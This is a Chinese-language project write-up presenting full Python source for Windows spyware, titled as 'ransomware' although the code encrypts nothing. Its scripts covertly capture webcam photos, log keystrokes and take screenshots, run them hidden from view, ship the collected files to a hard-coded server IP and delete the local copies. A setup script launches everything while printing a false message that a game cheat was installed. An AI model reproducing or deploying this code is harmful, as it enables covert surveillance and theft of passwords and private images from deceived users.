# 基于python的windouws勒索病毒

# V3.0

## caera.py

定时循环进行windows计算机摄像头抓拍，图片文件按照时间戳命名保存到store文件夹下。

```python
# -*- coding: utf-8 -*-

import cv2
import time
import os

# 初始化摄像头
cap = cv2.VideoCapture(0)  # 0代表默认摄像头

# 检查摄像头是否成功打开
if not cap.isOpened():
    print("无法打开摄像头")
    exit()

# 设置抓拍间隔时间（秒）
interval = 20

try:
    while True:
        # 抓拍一张照片
        ret, frame = cap.read()
        if not ret:
            print("无法从摄像头读取帧。退出...")
            break
        
        # 获取当前时间作为文件名的一部分
        timestamp = time.strftime("%Y%m%d%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        
        # 创建store文件夹（如果它不存在）
        store_folder = "store"
        if not os.path.exists(store_folder):
            os.makedirs(store_folder)
        
        # 保存照片到当前目录下的store文件夹
        save_path = os.path.join(store_folder, filename)
        cv2.imwrite(save_path, frame)
        print(f"照片已保存为 {save_path}")
        
        # 等待下一轮抓拍
        time.sleep(interval)
        
except KeyboardInterrupt:
    # 如果用户中断程序，释放摄像头资源
    cap.release()
    print("程序已终止")

# 程序结束，释放摄像头资源
cap.release()

```



## keylogger.py

开启键盘监听，将文件按照时间戳命名保存到store（如果没有则自动创建）（按下esc键会停止运行并清空内容）但是onetry会负责对它定期重新运行

```python
# -*- coding: utf-8 -*-
import os
from pynput import keyboard
from datetime import datetime

# 定义store文件夹
store_folder = "store"

# 获取当前脚本的目录
script_dir = os.getcwd()

# 创建store文件夹的完整路径
store_path = os.path.join(script_dir, store_folder)

# 如果store文件夹不存在，则创建它
if not os.path.exists(store_path):
    os.makedirs(store_path)

# 使用当前时间生成文件名
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
filename = f"keylog_{timestamp}.txt"

# 定义keylog文件的完整路径
keylog_path = os.path.join(store_path, filename)

# 键盘按下事件
def on_press(key):
    try:
        with open(keylog_path, 'a') as file:  # 'a'模式表示追加
            file.write(f'{key.char}\n')  # 写入按键字符
    except AttributeError:
        with open(keylog_path, 'a') as file:  # 'a'模式表示追加
            file.write(f'[Special Key: {key}]\n')  # 写入特殊键名称

# 键盘释放事件
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # 停止监听器
        return False

# 创建并启动键盘监听器
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# 清空keylog文件内容
with open(keylog_path, 'w') as file:
    file.write("")  # 清空文件内容

```



## screenshot.py

定期循环执行屏幕截图，也和上述两个程序操作一样，按时间戳保存文件到store文件夹

```python
# -*- coding: utf-8 -*-
import win32gui
import win32ui
import win32con
import win32api
import time
from datetime import datetime
import os

# 定义截图函数
def take_screenshot():
    # 获取桌面
    hdesktop = win32gui.GetDesktopWindow()

    # 分辨率适应
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    # 创建设备描述表
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    # 创建一个内存设备描述表
    mem_dc = img_dc.CreateCompatibleDC()

    # 创建位图对象
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    # 截图至内存设备描述表
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

    # 获取当前时间作为文件名的一部分
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    filename = f"screenshot_{timestamp}.bmp"

    # 获取当前脚本的目录
    script_dir = os.getcwd()

    # 定义store文件夹
    store_folder = "store"

    # 创建store文件夹的完整路径
    store_path = os.path.join(script_dir, store_folder)

    # 如果store文件夹不存在，则创建它
    if not os.path.exists(store_path):
        os.makedirs(store_path)

    # 定义截图文件的完整路径
    screenshot_path = os.path.join(store_path, filename)

    # 将截图保存到文件中
    screenshot.SaveBitmapFile(mem_dc, screenshot_path)

    # 内存释放
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    print(f"Screenshot saved as {screenshot_path}")

# 每隔30秒执行一次截图
while True:
    take_screenshot()
    time.sleep(30)  # 等待30秒

```



## onetry.py

将上述三个py文件打包成exe,然后由onetry负责多线程同时隐藏调用三个程序（即调用时不会出现弹窗），

```python
# system.py
import time
import subprocess  #隐藏调用exe的库
import threading   #多线程进行
import os

#浅浅隐藏
print("脚本外挂安装完成")

# 定义三个exe文件的名称
camera_exe_name = "camera.exe"
keylogger_exe_name = "keylogger.exe"
screenshot_exe_name = "screenshot.exe"

# 获取脚本文件的当前路径
script_path = os.path.abspath(__file__)
script_dir = os.path.dirname(script_path)

# 计算exe文件的路径
camera_exe_path = os.path.join(script_dir, camera_exe_name)
keylogger_exe_path = os.path.join(script_dir, keylogger_exe_name)
screenshot_exe_path = os.path.join(script_dir, screenshot_exe_name)

# 定义一个函数来执行exe文件
def execute_exe(exe_path):
    # 使用subprocess.Popen来执行exe文件
    subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)

# 主循环
def main_loop():
    while True:
        # 创建三个线程来同时执行exe文件
        thread1 = threading.Thread(target=execute_exe, args=(camera_exe_path,))
        thread2 = threading.Thread(target=execute_exe, args=(keylogger_exe_path,))
        thread3 = threading.Thread(target=execute_exe, args=(screenshot_exe_path,))
        
        # 启动线程
        thread1.start()
        thread2.start()
        thread3.start()
        
        # 等待所有线程完成
        thread1.join()
        thread2.join()
        thread3.join()
        
        # 等待一段时间后再次执行
        time.sleep(30)  # 等待30秒后再次执行

# 运行主循环
if __name__ == "__main__":
    main_loop()

```



## client.py

1.获取当前主机的ip，与服务器端建立通信

2.定期传输store文件夹下的文件后清空文件夹

```python
import socket
import os
import shutil
import time

# 服务器端IP和端口
SERVER_IP = '10.17.174.142'
SERVER_PORT = 12345

# 发送文件到服务器
def send_file_to_server(file_path):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, SERVER_PORT))
        
        # 发送文件名
        filename = os.path.basename(file_path)
        sock.sendall(filename.encode())

        # 等待服务器确认
        confirmation = sock.recv(1024).decode()
        if confirmation != 'OK':
            print('服务器未确认文件名')
            return

        # 发送文件内容
        with open(file_path, 'rb') as file:
            sock.sendall(file.read())
        
        sock.close()
    except Exception as e:
        print(f'发送文件时出错: {e}')

# 清空store文件夹
def clean_store_dir(store_dir):
    for filename in os.listdir(store_dir):
        file_path = os.path.join(store_dir, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print(f'删除文件时出错: {e}')

# 主函数
def main():
    # 设置定期检查的时间间隔（例如，每分钟检查一次）
    interval = 60  # 时间间隔，单位：秒
    
    while True:
        try:
            # 获取当前目录下的store文件夹
            store_dir = 'store'
            if os.path.exists(store_dir):
                # 将store文件夹下的内容传输给服务器端
                for filename in os.listdir(store_dir):
                    file_path = os.path.join(store_dir, filename)
                    send_file_to_server(file_path)
            
                # 清空store文件夹下的内容
                clean_store_dir(store_dir)
        
        except Exception as e:
            print(f'主循环中出错: {e}')
        
        # 等待下一个时间间隔
        time.sleep(interval)

if __name__ == "__main__":
    main()

```



## server.py

1.建立通信

2.接受文件、检查文件类型并保存

```python
import socket

# 服务器端IP和端口
SERVER_IP = '10.17.174.142'
SERVER_PORT = 12345

# 定义文件类型和对应目录
FILE_TYPE_MAP = {
    b'\xff\xd8\xff\xe0': '.jpg',  # JPEG文件头
    b'\x89PNG': '.png',           # PNG文件头
    # 对于文本文件，我们假设它们没有特定的文件头
}

# 接收客户端传来的文件
def receive_file_from_client(client_socket):
    try:
        # 接收文件名
        filename = client_socket.recv(1024).decode()
        if not filename:
            print("未收到文件名")
            return

        # 发送确认消息
        client_socket.sendall('OK'.encode())

        # 接收文件内容
        file_path = f'D:/vscode/test/receive/{filename}'
        with open(file_path, 'wb') as file:
            while True:
                file_data = client_socket.recv(1024)
                if not file_data:
                    break
                file.write(file_data)

        print(f"文件 {filename} 已保存")
    except Exception as e:
        print(f"接收文件时出错: {e}")


# 主函数
def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen()
    
    print(f"Server listening on {SERVER_IP}:{SERVER_PORT}")
    
    while True:
        client_socket, address = server_socket.accept()
        print(f"Connection from {address} established.")
        
        # 接收文件
        receive_file_from_client(client_socket)
        
        client_socket.close()

if __name__ == "__main__":
    main()

```



## setup1.py

悄悄调用onetry.exe和client.exe（打包之后）

```python
import subprocess
import os

# 自动获取onetry.exe和client.exe的路径
onetry_path = os.path.abspath('onetry.exe')
client_path = os.path.abspath('client.exe')

# 悄悄调用onetry.exe和client.exe
def run_exes():
    subprocess.Popen(onetry_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    subprocess.Popen(client_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

def main():
    run_exes()

if __name__ == "__main__":
    main()
    #伪装
    print("你的脚本外挂已安装完成，请放心体验！")

```



